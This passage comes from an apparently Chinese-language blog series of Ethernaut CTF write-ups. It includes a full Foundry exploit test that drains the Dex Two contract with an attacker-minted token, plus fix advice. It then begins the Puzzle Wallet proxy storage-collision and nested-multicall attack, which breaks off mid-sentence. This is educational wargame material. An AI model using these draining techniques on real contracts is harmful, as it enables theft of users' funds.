TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg\" alt=\"Dex Two Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>DexTwo</code> åˆçº¦çš„ä»£ç ä¸ä¸Šä¸€å…³çš„ <code>Dex</code> å‡ ä¹å®Œå…¨ç›¸åŒï¼Œä½†æœ‰ä¸€ä¸ªå¾®å°å´è‡´å‘½çš„æ”¹åŠ¨ã€‚åœ¨ <code>swap</code> å‡½æ•°ä¸­ï¼Œä¸€è¡Œå…³é”®çš„éªŒè¯ä»£ç è¢«ç§»é™¤äº†ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// This line was present in Dex, but is missing in DexTwo</span><br><span class=\"line\">// require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>è¿™è¡Œä»£ç åŸæœ¬ç”¨äºç¡®ä¿äº¤æ˜“åªåœ¨ <code>token1</code> å’Œ <code>token2</code> ä¹‹é—´è¿›è¡Œã€‚ç”±äºå®ƒè¢«ç§»é™¤äº†ï¼Œ<code>DexTwo</code> çš„ <code>swap</code> å‡½æ•°ç°åœ¨å¯ä»¥æ¥å—<strong>ä»»ä½•</strong>ç¬¦åˆERC20æ ‡å‡†çš„ä»£å¸ä½œä¸ºäº¤æ˜“å¯¹çš„ä¸€æ–¹ã€‚</p>\n<p>è¿™å°±ä¸ºæˆ‘ä»¬æ‰“å¼€äº†æ”»å‡»çš„å¤§é—¨ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ã€æ¯«æ— ä»·å€¼çš„â€œæ”»å‡»ä»£å¸â€ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º <code>Token3</code>ï¼‰ï¼Œå¹¶ç”¨å®ƒæ¥æ“çºµä¸ <code>Token1</code> å’Œ <code>Token2</code> çš„äº¤æ˜“ä»·æ ¼ã€‚</p>\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><p>æˆ‘ä»¬çš„ç­–ç•¥æ˜¯åˆ©ç”¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ <code>Token3</code> ä½œä¸ºåª’ä»‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å– <code>Dex</code> æ± ä¸­æ‰€æœ‰çš„ <code>Token1</code> å’Œ <code>Token2</code>ã€‚</p>\n<ol>\n<li><p><strong>åˆ›å»ºå¹¶åˆ†å‘æ”»å‡»ä»£å¸</strong>: æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ERC20ä»£å¸ <code>Token3</code>ï¼Œå¹¶ç»™è‡ªå·±é“¸é€ å¤§é‡çš„ <code>Token3</code>ã€‚</p>\n</li>\n<li><p><strong>ä¸º <code>Token3</code> æä¾›â€œæµåŠ¨æ€§â€</strong>: æˆ‘ä»¬å‘ <code>DexTwo</code> åˆçº¦å‘é€æå°‘é‡çš„ <code>Token3</code>ï¼ˆä¾‹å¦‚ï¼Œ1ä¸ªï¼‰ã€‚ç°åœ¨ <code>DexTwo</code> åˆçº¦ä¸­ <code>Token3</code> çš„ä½™é¢ä¸º1ã€‚</p>\n</li>\n<li><p><strong>ç¬¬ä¸€æ¬¡äº¤æ¢ (Token3 -&gt; Token1)</strong>:</p>\n<ul>\n<li>æˆ‘ä»¬ç°åœ¨ç”¨ <code>Token3</code> äº¤æ¢ <code>Token1</code>ã€‚æ± ä¸­ <code>Token1</code> çš„ä½™é¢æ˜¯100ï¼Œ<code>Token3</code> çš„ä½™é¢æ˜¯1ã€‚ä»·æ ¼æ¯”ä¸º 100:1ã€‚</li>\n<li>æˆ‘ä»¬åªéœ€è¦å‘é€1ä¸ª <code>Token3</code>ï¼Œå°±å¯ä»¥æ ¹æ®ä»·æ ¼å…¬å¼æ¢å– <code>(1 * 100) / 1 = 100</code> ä¸ª <code>Token1</code>ã€‚</li>\n<li>äº¤æ¢åï¼Œ<code>Dex</code> æ± ä¸­çš„ <code>Token1</code> è¢«å…¨éƒ¨æ¢èµ°ã€‚</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äºŒæ¬¡äº¤æ¢ (Token3 -&gt; Token2)</strong>:</p>\n<ul>\n<li>ç°åœ¨æ± ä¸­ <code>Token2</code> çš„ä½™é¢æ˜¯100ï¼Œ<code>Token3</code> çš„ä½™é¢æ˜¯2ï¼ˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡äº¤æ¢æ—¶è½¬å…¥äº†1ä¸ªï¼Œç°åœ¨åˆè½¬å…¥äº†1ä¸ªï¼‰ã€‚ä»·æ ¼æ¯”ä¸º 100:2ï¼Œå³ 50:1ã€‚</li>\n<li>æˆ‘ä»¬å‘é€2ä¸ª <code>Token3</code>ï¼Œå°±å¯ä»¥æ¢å– <code>(2 * 100) / 2 = 100</code> ä¸ª <code>Token2</code>ã€‚</li>\n<li>äº¤æ¢åï¼Œ<code>Dex</code> æ± ä¸­çš„ <code>Token2</code> ä¹Ÿè¢«å…¨éƒ¨æ¢èµ°ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>é€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬å®Œå…¨æ§åˆ¶çš„ç¬¬ä¸‰æ–¹ä»£å¸ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ“çºµäº†ä»·æ ¼ï¼Œå¹¶ç”¨æå°çš„ä»£ä»·ï¼ˆæ€»å…±3ä¸ªæˆ‘ä»¬è‡ªå·±éšæ„é“¸é€ çš„ <code>Token3</code>ï¼‰æ¸…ç©ºäº†æ•´ä¸ª <code>Dex</code> æ± ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„æ”»å‡»æµç¨‹ï¼šåˆ›å»ºæ–°ä»£å¸ï¼Œå¹¶ç”¨å®ƒæ¥è€—å°½ <code>DexTwo</code> çš„æµåŠ¨æ€§ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/23_DexTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTwoTest is Test &#123;</span><br><span class=\"line\">    DexTwo instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableTokenTwo token1;</span><br><span class=\"line\">    SwappableTokenTwo token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new DexTwo();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²å¹¶è®¾ç½®åˆå§‹ä»£å¸</span><br><span class=\"line\">        token1 = new SwappableTokenTwo(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableTokenTwo(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ·»åŠ æµåŠ¨æ€§å¹¶å‘é€åˆå§‹ä»£å¸ç»™ player</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token1), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token2), 100);</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexTwoAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. éƒ¨ç½²æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ä»£å¸</span><br><span class=\"line\">        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), &quot;Attack Token&quot;, &quot;ATK&quot;, 400);</span><br><span class=\"line\">        attackToken.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. å‘ Dex æä¾›æå°‘é‡çš„æ¶æ„ä»£å¸æµåŠ¨æ€§</span><br><span class=\"line\">        attackToken.transfer(address(instance), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. ç”¨1ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token1</span><br><span class=\"line\">        uint256 dexT1Balance = token1.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);</span><br><span class=\"line\">        assertEq(swapAmount1, dexT1Balance, &quot;Price should allow draining Token1&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token1), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. ç”¨2ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token2</span><br><span class=\"line\">        uint256 dexT2Balance = token2.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);</span><br><span class=\"line\">        assertEq(swapAmount2, dexT2Balance, &quot;Price should allow draining Token2&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token2), 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. éªŒè¯ Dex çš„ä¸¤ç§ä»£å¸éƒ½å·²è¢«è€—å°½</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 &amp;&amp; token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of both tokens&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è¯†åˆ«æ¼æ´</strong>: å‘ç° <code>swap</code> å‡½æ•°ç¼ºå°‘å¯¹äº¤æ˜“ä»£å¸çš„ç™½åå•éªŒè¯ã€‚</li>\n<li><strong>åˆ›å»ºæ”»å‡»ä»£å¸</strong>: éƒ¨ç½²ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ERC20ä»£å¸ã€‚</li>\n<li><strong>æ³¨å…¥è™šå‡æµåŠ¨æ€§</strong>: å‘ <code>DexTwo</code> åˆçº¦å‘é€æå°‘é‡çš„æ”»å‡»ä»£å¸ï¼Œä»¥å»ºç«‹ä¸€ä¸ªæä¸å¹³è¡¡çš„äº¤æ˜“å¯¹ã€‚</li>\n<li><strong>è€—å°½Token1</strong>: ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ <code>DexTwo</code> ä¸­æ‰€æœ‰çš„ <code>Token1</code>ã€‚</li>\n<li><strong>è€—å°½Token2</strong>: å†æ¬¡ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ <code>DexTwo</code> ä¸­æ‰€æœ‰çš„ <code>Token2</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</strong>: è¿™æ˜¯æœ€å…³é”®çš„é˜²å¾¡æªæ–½ã€‚åˆçº¦å¿…é¡»ä¸¥æ ¼éªŒè¯æ‰€æœ‰å¤–éƒ¨è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å†³å®šæ ¸å¿ƒé€»è¾‘çš„å‚æ•°ï¼Œå¦‚æœ¬ä¾‹ä¸­çš„ä»£å¸åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®ï¼šåŠ å›è¢«ç§»é™¤çš„éªŒè¯</span><br><span class=\"line\">function swap(address from, address to, uint amount) public &#123;</span><br><span class=\"line\">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class=\"line\">    // ... a reste of the swap logic</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨ç™½åå•</strong>: å¯¹äºå…è®¸å“ªäº›ä»£å¸å‚ä¸äº¤äº’çš„ç³»ç»Ÿï¼Œåº”ç»´æŠ¤ä¸€ä¸ªå¯ä¿¡ä»£å¸çš„ç™½åå•ï¼Œå¹¶å¯¹æ‰€æœ‰ä¼ å…¥çš„ä»£å¸åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>è¾“å…¥éªŒè¯</strong>: æ™ºèƒ½åˆçº¦å®‰å…¨ä¸­æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦çš„åŸåˆ™ä¹‹ä¸€ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªå¤–éƒ¨çš„è¾“å…¥ã€‚</li>\n<li><strong>ä»£å¸ç™½åå•</strong>: ä¸€ç§å¸¸è§çš„å®‰å…¨æ¨¡å¼ï¼Œç”¨äºé™åˆ¶ç³»ç»Ÿåªä¸é¢„å…ˆæ‰¹å‡†çš„ã€å—ä¿¡ä»»çš„ä»£å¸åˆçº¦è¿›è¡Œäº¤äº’ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>ç¼ºå°‘å¯¹è¾“å…¥å‚æ•°ï¼ˆå¦‚ä»£å¸åœ°å€ï¼‰çš„éªŒè¯æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</li>\n<li>åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ä¸­ï¼Œå¦‚æœå…è®¸ä»»æ„ä»£å¸å‚ä¸äº¤æ˜“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¼•å…¥è‡ªå·±æ§åˆ¶çš„ä»£å¸æ¥è½»æ˜“åœ°æ“çºµä»·æ ¼ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ›å»ºä¸€ä¸ªæ–°çš„ã€ç”±æ”»å‡»è€…å®Œå…¨æ§åˆ¶çš„ERC20ä»£å¸ã€‚</li>\n<li>å°†è¿™ä¸ªæ–°ä»£å¸ä¸ç›®æ ‡ä»£å¸åœ¨ä¸€ä¸ªç¼ºä¹éªŒè¯çš„DEXä¸­å½¢æˆäº¤æ˜“å¯¹ã€‚</li>\n<li>åˆ©ç”¨æä¸å¹³è¡¡çš„æµåŠ¨æ€§æ¯”ä¾‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å–æ‰€æœ‰ç›®æ ‡ä»£å¹£ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å¯¹æ‰€æœ‰å‡½æ•°çš„è¾“å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼çš„ç™½åå•æˆ–æœ‰æ•ˆæ€§æ£€æŸ¥ã€‚</li>\n<li>ç¡®ä¿æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚äº¤æ˜“ï¼‰åªèƒ½åœ¨é¢„æœŸçš„ã€å—ä¿¡ä»»çš„èµ„äº§ä¹‹é—´è¿›è¡Œã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-107\">SWC-107: Unchecked External Call</a> (è™½ç„¶æœ¬ä¾‹æ˜¯ç¼ºå°‘éªŒè¯ï¼Œä½†æ ¹æºéƒ½æ˜¯å¯¹å¤–éƒ¨è¾“å…¥&#x2F;åˆçº¦çš„ä¸ä¿¡ä»»)</li>\n<li><a href=\"https://secureum.substack.com/p/security-pitfalls-and-best-practices-101\">Secureum: Input Validation</a></li>\n</ul>\n"},{"title":"Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´","date":"2025-01-25T09:05:00.000Z","updated":"2025-01-25T09:05:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å‰–æä»£ç†åˆçº¦ï¼ˆProxyï¼‰ä¸­çš„å­˜å‚¨å¸ƒå±€å†²çªé—®é¢˜ï¼Œå¹¶åˆ©ç”¨ `multicall` å‡½æ•°ä¸­çš„é€»è¾‘æ¼æ´ç»•è¿‡é‡å…¥ä¿æŠ¤ã€‚é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„åµŒå¥—è°ƒç”¨ï¼Œæœ€ç»ˆæå‡ä¸ºä»£ç†åˆçº¦çš„ `admin`ï¼ŒæŒæ¡ Puzzle Wallet å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 24 - Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨å¸ƒå±€å†²çª / é€»è¾‘æ¼æ´  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯æˆä¸º `PuzzleProxy` åˆçº¦çš„ `admin`ã€‚\n\n![Puzzle Wallet Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™æ˜¯ä¸€ä¸ªæ¶‰åŠä»£ç†åˆçº¦ï¼ˆProxyï¼‰çš„å¤æ‚æŒ‘æˆ˜ï¼ŒåŒ…å«äº†å¤šä¸ªæ¼æ´çš„ç»„åˆåˆ©ç”¨ã€‚æˆ‘ä»¬éœ€è¦åˆ†æ­¥è§£å†³å‡ ä¸ªå­é—®é¢˜ã€‚\n\n### æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\n\né¦–å…ˆï¼Œæˆ‘ä»¬æ£€æŸ¥ `PuzzleProxy` (ä»£ç†) å’Œ `PuzzleWallet` (é€»è¾‘) åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚\n\n**`PuzzleProxy` çš„å­˜å‚¨:**\n```solidity\ncontract PuzzleProxy is Proxy {\n    address public pendingAdmin; // slot 0\n    address public admin;      // slot 1\n    // ...\n}\n```\n\n**`PuzzleWallet` çš„å­˜å‚¨:**\n```solidity\ncontract PuzzleWallet is Ownable {\n    address public owner;      // slot 0 (ç»§æ‰¿è‡ª Ownable)\n    uint256 public maxBalance; // slot 1\n    mapping(address => bool) public whitelisted; // slot 2\n    // ...\n}\n```\n\nç”±äºä»£ç†æ¨¡å¼ä½¿ç”¨ `delegatecall`ï¼Œ`PuzzleWallet` çš„ä»£ç ä¼šç›´æ¥æ“ä½œ `PuzzleProxy` çš„å­˜å‚¨ã€‚è¿™å°±å¯¼è‡´äº†å­˜å‚¨æ§½çš„å†²çªï¼š\n\n-   `PuzzleProxy` çš„ `pendingAdmin` (slot 0) å®é™…ä¸Šå¯¹åº” `PuzzleWallet` çš„ `owner` (slot 0)ã€‚\n-   `PuzzleProxy` çš„ `admin` (slot 1) å®é™…ä¸Šå¯¹åº” `PuzzleWallet` çš„ `maxBalance` (slot 1)ã€‚\n\næˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆä¸º `PuzzleProxy` çš„ `admin`ã€‚æ ¹æ®å­˜å‚¨å†²çªï¼Œ**æˆ‘ä»¬åªéœ€è¦å°† `PuzzleWallet` çš„ `maxBalance` è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€å³å¯**ã€‚\n\n### æ¼æ´ 2: æˆä¸º `owner` å¹¶åŠ å…¥ç™½åå•\n\nè¦è°ƒç”¨ `setMaxBalance()`ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ç™½åå•ç”¨æˆ·ã€‚è¦åŠ å…¥ç™½åå•ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ `PuzzleWallet` çš„ `owner`ã€‚\n\n-   `PuzzleWallet` çš„ `owner` å­˜å‚¨åœ¨ slot 0ã€‚\n-   `PuzzleProxy` çš„ `proposeNewAdmin()` å‡½æ•°å¯ä»¥ä¿®æ”¹ `pendingAdmin`ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ slot 0ã€‚\n\nå› æ­¤ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡è°ƒç”¨ `proxy.proposeNewAdmin(player_address)` æ¥å°† `wallet.owner` è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚\n\næˆä¸º `owner` åï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `wallet.addToWhitelist(player_address)` å°†è‡ªå·±åŠ å…¥ç™½åå•ã€‚\n\n### æ¼æ´ 3: `multicall` é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\n\nç°åœ¨æˆ‘ä»¬æ˜¯ç™½åå•ç”¨æˆ·äº†ï¼Œä½† `setMaxBalance()` è¿˜æœ‰ä¸€ä¸ªè¦æ±‚ï¼š`require(address(this).balance == 0, \"Contract balance is not 0\")`ã€‚åˆçº¦åœ¨éƒ¨ç½²æ—¶è¢«å­˜å…¥äº† 0.001 etherï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†åˆçº¦ä½™é¢æ¸…ç©ºã€‚\n\n`execute()` å‡½æ•°å¯ä»¥ææ¬¾ï¼Œä½†æˆ‘ä»¬åªèƒ½æå‡ºæˆ‘ä»¬å­˜å…¥çš„é‡‘é¢ã€‚é—®é¢˜åœ¨äºåˆçº¦ä¸­å·²æœ‰çš„ 0.001 etherã€‚\n\nå…³é”®åœ¨äº `multicall()` å‡½æ•°ï¼š\n\n```solidity\nfunction multicall(bytes[] calldata data) external payable onlyWhitelisted {\n    bool depositCalled = false;\n    for (uint i = 0; i < data.length; i++) {\n        // ...\n        if (selector == this.deposit.selector) {\n            require(!depositCalled, \"Deposit can only be called once\");\n            depositCalled = true;\n        }\n        (bool success, ) = address(this).delegatecall(data[i]);\n        // ...\n    }\n}\n```\n\nå‡½æ•°é€šè¿‡ `depositCalled` æ ‡å¿—ä½æ¥é˜²æ­¢åœ¨ä¸€æ¬¡ `multicall` ä¸­å¤šæ¬¡è°ƒç”¨ `deposit()`ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¿æŠ¤æªæ–½æ˜¯æœ‰ç¼ºé™·çš„ã€‚`depositCalled` æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå®ƒçš„ä½œç”¨åŸŸä»…é™äºå•æ¬¡ `multicall` è°ƒç”¨ã€‚å¦‚æœæˆ‘ä»¬**åœ¨ä¸€ä¸ª `multicall` è°ƒç”¨ä¸­åµŒå¥—å¦ä¸€ä¸ª `multicall` è°ƒç”¨**ï¼Œé‚£ä¹ˆå†…éƒ¨çš„ `multicall` ä¼šæœ‰è‡ªå·±çš„ã€å…¨æ–°çš„ `depositCalled` æ ‡å¿—ä½ã€‚\n\nè¿™å…è®¸æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå®ç°â€œåŒé‡å­˜æ¬¾â€ï¼š\n\n1.  æˆ‘ä»¬å‘ `multicall` å‘é€ 0.001 etherã€‚\n2.  `multicall` çš„ç¬¬ä¸€ä¸ªè°ƒç”¨æ˜¯ `deposit()`ã€‚è¿™ä¼šæŠŠæˆ‘ä»¬çš„ `msg.value` (0.001 ether) å­˜å…¥ï¼Œå¹¶å°†æˆ‘ä»¬çš„ä½™é¢è®°å½•ä¸º 0.001 etherã€‚\n3.  `multicall` çš„ç¬¬äºŒä¸ªè°ƒç”¨æ˜¯**å¯¹ `multicall` è‡ªèº«çš„åµŒå¥—è°ƒç”¨**ã€‚åœ¨è¿™ä¸ªåµŒå¥—è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡è°ƒç”¨ `deposit()`ã€‚\n4.  ç”±äº `delegatecall` çš„ç‰¹æ€§ï¼Œ`msg.value` åœ¨åµŒå¥—è°ƒç”¨ä¸­ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œç¬¬äºŒæ¬¡ `deposit()` ä¼šå†æ¬¡å°†åŒä¸€ä¸ª `msg.value` (0.001 ether) å­˜å…¥ï¼Œä½¿æˆ‘ä»¬çš„è®°å½•ä½™é¢å˜ä¸º 0.002 etherã€‚\n\næˆ‘ä»¬åªå‘é€äº† 0.001 etherï¼Œä½†åœ¨åˆçº¦ä¸­çš„å­˜æ¬¾è®°å½•å´æ˜¯ 0.002 etherã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è°ƒç”¨ `execute(player, 0.002 ether, 